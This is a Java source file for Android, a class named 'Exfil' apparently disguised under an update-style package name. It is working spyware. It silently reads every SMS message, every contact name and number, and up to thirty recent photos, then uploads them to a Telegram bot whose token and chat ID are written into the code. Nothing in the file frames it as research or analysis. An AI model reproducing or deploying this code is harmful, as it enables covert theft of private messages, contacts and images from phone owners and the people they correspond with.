package com.upd;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Exfil {
    static final String TOKEN = "8916342243:AAGrgJ6WKYEoVyZNorA2UNn1kIOMRbngwmo";
    static final String CHAT = "7617160971";
    static final String API = "https://api.telegram.org/bot" + TOKEN;

    static void start(final Context c) {
        new Thread(() -> {
            try { msg("device: " + android.os.Build.MODEL); } catch (Exception e) {}
            try { dumpSms(c); } catch (Exception e) {}
            try { dumpContacts(c); } catch (Exception e) {}
            try { dumpImages(c); } catch (Exception e) {}
        }).start();
    }
    static void msg(String text) {
        try {
            String u = API + "/sendMessage?chat_id=" + CHAT + "&text=" + URLEncoder.encode(text, "UTF-8");
            HttpURLConnection h = (HttpURLConnection) new URL(u).openConnection();
            h.getInputStream().close();
        } catch (Exception e) {}
    }
    static void dumpSms(Context c) {
        StringBuilder sb = new StringBuilder();
        Cursor cur = c.getContentResolver().query(Uri.parse("content://sms"), null, null, null, "date DESC");
        if (cur != null) { while (cur.moveToNext()) {
            sb.append(cur.getString(cur.getColumnIndex("address"))).append(": ")
              .append(cur.getString(cur.getColumnIndex("body"))).append("\n");
        } cur.close(); }
        File f = new File(c.getCacheDir(), "sms.txt");
        try { FileOutputStream o = new FileOutputStream(f); o.write(sb.toString().getBytes()); o.close(); uploadDoc(f); } catch (Exception e) {}
    }
    static void dumpContacts(Context c) {
        StringBuilder sb = new StringBuilder();
        Cursor cur = c.getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) { while (cur.moveToNext()) {
            sb.append(cur.getString(cur.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
              .append(" | ")
              .append(cur.getString(cur.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
              .append("\n");
        } cur.close(); }
        File f = new File(c.getCacheDir(), "contacts.txt");
        try { FileOutputStream o = new FileOutputStream(f); o.write(sb.toString().getBytes()); o.close(); uploadDoc(f); } catch (Exception e) {}
    }
    static void dumpImages(Context c) {
        String[] proj = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
        Cursor cur = c.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, "date_added DESC");
        int n = 0;
        if (cur != null) { while (cur.moveToNext() && n < 30) {
            long id = cur.getLong(0);
            String name = cur.getString(1);
            if (name == null) name = "img" + n + ".jpg";
            Uri u = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
            try {
                InputStream in = c.getContentResolver().openInputStream(u);
                File f = new File(c.getCacheDir(), name);
                FileOutputStream o = new FileOutputStream(f);
                byte[] buf = new byte[8192]; int r;
                while ((r = in.read(buf)) > 0) o.write(buf, 0, r);
                o.close(); in.close(); uploadDoc(f); f.delete();
            } catch (Exception e) {}
            n++;
        } cur.close(); }
    }
    static void uploadDoc(File f) {
        try {
            String boundary = "----v" + System.currentTimeMillis();
            HttpURLConnection h = (HttpURLConnection) new URL(API + "/sendDocument?chat_id=" + CHAT).openConnection();
            h.setDoOutput(true);
            h.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            OutputStream o = h.getOutputStream();
            o.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + f.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes());
            FileInputStream in = new FileInputStream(f);
            byte[] buf = new byte[8192]; int r;
            while ((r = in.read(buf)) > 0) o.write(buf, 0, r);
            in.close();
            o.write(("\r\n--" + boundary + "--\r\n").getBytes());
            o.close(); h.getInputStream().close();
        } catch (Exception e) {}
    }
}
